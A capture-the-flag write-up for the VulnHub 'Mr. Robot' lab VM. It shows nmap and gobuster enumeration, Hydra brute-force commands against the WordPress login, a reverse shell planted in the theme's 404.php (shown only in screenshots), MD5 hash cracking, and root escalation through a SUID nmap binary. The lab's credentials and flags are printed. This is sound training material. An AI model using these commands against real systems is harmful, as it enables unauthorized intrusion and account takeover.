# CTF Write-up: Mr. Robot VM (VulnHub)

This machine was originally solved during an early stage of learning. This write-up revisits the challenge with a more structured methodology and clearer analysis.

* **Machine Name:** Mr. Robot  
* **Platform:** VulnHub  
* **Difficulty:** Beginner–Intermediate  

**Description (as per the VulnHub page):**

```txt
Based on the show, Mr. Robot.
This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find.
The VM isn't too difficult. There isn't any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.
```

Although the machine is themed around a fictional setting, the techniques involved reflect common real-world practices, particularly in enumeration, credential discovery, and privilege escalation.

---

## 1. Initial Reconnaissance

The initial step focuses on identifying exposed services and their versions to map the attack surface.

```bash
root@machine~$ nmap -p- -sV 192.168.3.13 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-03 21:22 +0530
Nmap scan report for 192.168.3.13
Host is up (0.00080s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
MAC Address: 08:00:27:FD:11:59 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.06 seconds
```

**Key Findings:**

* Port 80 (HTTP) open — Apache web server
* Port 443 (HTTPS) open — Apache web server with SSL
* Port 22 (SSH) closed

Both HTTP and HTTPS services appear to host the same application, with HTTPS providing encrypted access. No additional services are exposed, indicating a limited external attack surface.

The SSH port is explicitly marked as closed rather than filtered, suggesting that remote shell access is intentionally disabled rather than protected by a firewall.

With only web services available, the attack surface is clearly constrained to the web layer. This directs further efforts toward web enumeration rather than network-level exploitation.

---

## 2. Web Enumeration

Upon visiting and interacting with the web application through a browser, no immediately useful functionality or input vectors were identified. This suggests the need for deeper enumeration.

To expand the attack surface, directory brute-forcing was performed.

```bash
root@machine~$ gobuster dir --url 192.168.3.13 --wordlist /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.8.2
===============================================================
[+] Url:                     http://192.168.3.13
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 213]
.htaccess            (Status: 403) [Size: 218]
.htpasswd            (Status: 403) [Size: 218]
0                    (Status: 301) [Size: 0] [--> http://192.168.3.13/0/]
admin                (Status: 301) [Size: 234] [--> http://192.168.3.13/admin/]
atom                 (Status: 301) [Size: 0] [--> http://192.168.3.13/feed/atom/]
audio                (Status: 301) [Size: 234] [--> http://192.168.3.13/audio/]
blog                 (Status: 301) [Size: 233] [--> http://192.168.3.13/blog/]
css                  (Status: 301) [Size: 232] [--> http://192.168.3.13/css/]
dashboard            (Status: 302) [Size: 0] [--> http://192.168.3.13/wp-admin/]
favicon.ico          (Status: 200) [Size: 0]
feed                 (Status: 301) [Size: 0] [--> http://192.168.3.13/feed/]
images               (Status: 301) [Size: 235] [--> http://192.168.3.13/images/]
image                (Status: 301) [Size: 0] [--> http://192.168.3.13/image/]
Image                (Status: 301) [Size: 0] [--> http://192.168.3.13/Image/]
index.html           (Status: 200) [Size: 1188]
index.php            (Status: 301) [Size: 0] [--> http://192.168.3.13/]
intro                (Status: 200) [Size: 516314]
js                   (Status: 301) [Size: 231] [--> http://192.168.3.13/js/]
license              (Status: 200) [Size: 309]
login                (Status: 302) [Size: 0] [--> http://192.168.3.13/wp-login.php]
page1                (Status: 301) [Size: 0] [--> http://192.168.3.13/]
phpmyadmin           (Status: 403) [Size: 94]
readme               (Status: 200) [Size: 64]
rdf                  (Status: 301) [Size: 0] [--> http://192.168.3.13/feed/rdf/]
robots               (Status: 200) [Size: 41]
robots.txt           (Status: 200) [Size: 41]
rss                  (Status: 301) [Size: 0] [--> http://192.168.3.13/feed/]
rss2                 (Status: 301) [Size: 0] [--> http://192.168.3.13/feed/]
sitemap              (Status: 200) [Size: 0]
sitemap.xml          (Status: 200) [Size: 0]
video                (Status: 301) [Size: 234] [--> http://192.168.3.13/video/]
wp-admin             (Status: 301) [Size: 237] [--> http://192.168.3.13/wp-admin/]
wp-content           (Status: 301) [Size: 239] [--> http://192.168.3.13/wp-content/]
wp-includes          (Status: 301) [Size: 240] [--> http://192.168.3.13/wp-includes/]
wp-config            (Status: 200) [Size: 0]
wp-cron              (Status: 200) [Size: 0]
wp-links-opml        (Status: 200) [Size: 227]
wp-load              (Status: 200) [Size: 0]
wp-login             (Status: 200) [Size: 2606]
wp-settings          (Status: 500) [Size: 0]
wp-signup            (Status: 302) [Size: 0] [--> http://192.168.3.13/wp-login.php?action=register]
xmlrpc               (Status: 405) [Size: 42]
xmlrpc.php           (Status: 405) [Size: 42]
wp-mail              (Status: 500) [Size: 3074]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

### Key Findings

* The presence of endpoints such as `wp-admin`, `wp-content`, and `wp-includes` strongly indicates that the application is built on WordPress.

* A `readme` page was discovered containing the message:

`I like where you head is at. However I'm not going to help you.`

![readme page](/img/VulnHubMrRobot/1.png)

* A `robots.txt` file was identified:

![robots.txt](/img/VulnHubMrRobot/2.png)

The `robots.txt` file reveals two interesting entries:

* `key-1-of-3.txt`
* `fsocity.dic`

Accessing `key-1-of-3.txt` reveals the first flag:

![key-1-of-3.txt](/img/VulnHubMrRobot/3.png)

```key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
```

The file `fsocity.dic` appears to be a large wordlist, which may be useful for password attacks:

![fsocity.dic](/img/VulnHubMrRobot/4.png)

* The WordPress login panel is accessible at `/wp-login.php`. Upon testing the login functionality with arbitrary input, the application returns a distinct error message: `ERROR: Invalid username.` instead of a generic authentication failure message.

![wp-login.php](/img/VulnHubMrRobot/5.png)

The verbose authentication error reveals a classic username enumeration vulnerability. Since the application differentiates between invalid usernames and incorrect passwords, it becomes possible to identify valid usernames with high confidence.

Additionally, the presence of `fsocity.dic` suggests that the challenge is intentionally providing a wordlist, likely to be used for brute-force attacks against the login panel.

This combination significantly lowers the difficulty of credential discovery, aligning with the intended beginner–intermediate level of the machine.

---

## 3. Web Exploitation

Although the most obvious next step is to attempt credential-based login on the WordPress panel, alternative attack vectors were explored first. These included searching for publicly available exploits targeting the specific WordPress version or installed plugins.

No relevant exploits were identified, so the approach shifted toward credential brute-forcing.

The wordlist `fsocity.dic` was downloaded:

```bash
wget http://192.168.3.13/fsocity.dic -q
```

After downloading, it was observed that the wordlist contained a large number of duplicate entries. To optimize the brute-force process, duplicates were removed:

```bash
sort -u fsocity.dic > fsocity.txt
```

This reduced the wordlist size significantly, from 858,160 entries to 11,451.

![picture showing: downloading fsocity.dic then checking its word count, then sorting and removing duplicates](/img/VulnHubMrRobot/6.png)

### Username Enumeration

To perform a brute-force attack against the login form, the request structure needed to be identified. This was achieved using Burp Suite to intercept a login request.

```php
log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.3.13%2Fwp-admin%2F&testcookie=1
```

The `redirect_to` parameter is not required for authentication and can be removed:

```php
log=admin&pwd=admin&wp-submit=Log+In
```

Using this structure, Hydra was configured to enumerate valid usernames:

```bash
hydra -L fsocity.txt -p test 192.168.3.13 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

* A placeholder password (`test`) is used since the response message `Invalid username` is returned regardless of password correctness.

```bash
[80][http-post-form] host: 192.168.3.13   login: Elliot   password: test
```

A valid username was identified: `Elliot`.

### Password Brute-Forcing

With a confirmed username, the next step was password brute-forcing:

```bash
hydra -l Elliot -P fsocity.txt 192.168.3.13 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'

[...]

[80][http-post-form] host: 192.168.3.13   login: Elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
```

Valid credentials: `Elliot : ER28-0652`

Using these credentials, access to the WordPress admin panel was obtained.

![wp-admin after logging in](/img/VulnHubMrRobot/7.png)

### Privilege Verification

Upon inspection of the admin dashboard, the `Elliot` account was confirmed to have administrator privileges.

![highligthing the administrator role at /wp-admin/users.php after logging in](/img/VulnHubMrRobot/8.png)

This level of access allows modification of the website’s backend, including PHP files.

### Gaining Remote Code Execution

With administrative access, a common technique is to modify theme files to inject a reverse shell. In this case, the `404.php` file was targeted, as it executes whenever a non-existent page is requested.

The theme editor can be accessed via:

* `Appearance → Editor`
* `/wp-admin/theme-editor.php`

![theme editor](/img/VulnHubMrRobot/9.png)

The `404.php` file was selected:

![selecting 404.php](/img/VulnHubMrRobot/10.png)

Its contents were replaced with a PHP reverse shell:

![replacing the content of 404.php with revershell](/img/VulnHubMrRobot/11.png)

After updating the file, a listener was started using Netcat:

![listening to the upcoming connection on port 4444 via Netcat](/img/VulnHubMrRobot/12.png)

To trigger execution, a request was made for a non-existent resource:

![requesting non existing content](/img/VulnHubMrRobot/13.png)

This resulted in a successful reverse shell connection:

![shell obtained](/img/VulnHubMrRobot/14.png)

---

## 4. Post Exploitation

After gaining a shell, enumeration of the system began. Navigating to `/home/robot` revealed the following:

![/home/robot](/img/VulnHubMrRobot/15.png)

Two files were identified:

* `key-2-of-3.txt`
* `password.raw-md5`

From the listing, it is clear that the current user does not have permission to read `key-2-of-3.txt`. However, the file `password.raw-md5` is accessible and contains the following:

```password.raw-md5"
robot:c3fcd3d76192e4007dfb496cca67e13b
```

![failed attempt](/img/VulnHubMrRobot/16.png)

### Hash Cracking

An initial attempt was made to crack the hash using the previously obtained `fsocity.txt` wordlist, but this was unsuccessful.

Switching to the commonly used `rockyou.txt` wordlist resulted in a successful crack:

![successful attempt](/img/VulnHubMrRobot/17.png)

Recovered credentials:

```password.txt
robot:abcdefghijklmnopqrstuvwxyz
```

### User Privilege Escalation (robot)

To switch to the `robot` user, a more stable shell was required. A pseudo-terminal was spawned using Python:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

This provided a usable shell without performing full TTY stabilization.

Using the recovered credentials, access to the `robot` account was obtained. With appropriate permissions, the second key could now be read:

![upgrading the shell changing useraccount to robot and reading the key-2-of-3.txt](/img/VulnHubMrRobot/18.png)

```key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

### Privilege Escalation (root)

Further enumeration was conducted to identify potential privilege escalation vectors. One common technique is to search for binaries with the SUID bit set:

```bash
find / -perm -4000 -type f 2>/dev/null

or

find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null
```

The results revealed that `/usr/local/bin/nmap` has the SUID bit enabled:

![higlighting Nmap in the find result](/img/VulnHubMrRobot/19.png)

The version of Nmap was identified as `3.81`:

![highlighting nmap version](/img/VulnHubMrRobot/20.png)

This is significant because older versions of Nmap include an interactive mode that can be abused for privilege escalation.

[GTFOBins](https://gtfobins.org/gtfobins/nmap/#shell)

Researching known exploitation techniques led to the following method:

![nmap exploit on the gtfobins website](/img/VulnHubMrRobot/21.png)

```txt
nmap --interactive
!/bin/sh
```

### Exploitation

Executing the above commands spawns a shell with elevated privileges due to the SUID bit set on the Nmap binary.

The exploit was performed as follows:

![Using the exploit](/img/VulnHubMrRobot/22.png)

With root access obtained, the final key was retrieved:

```bash
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

---
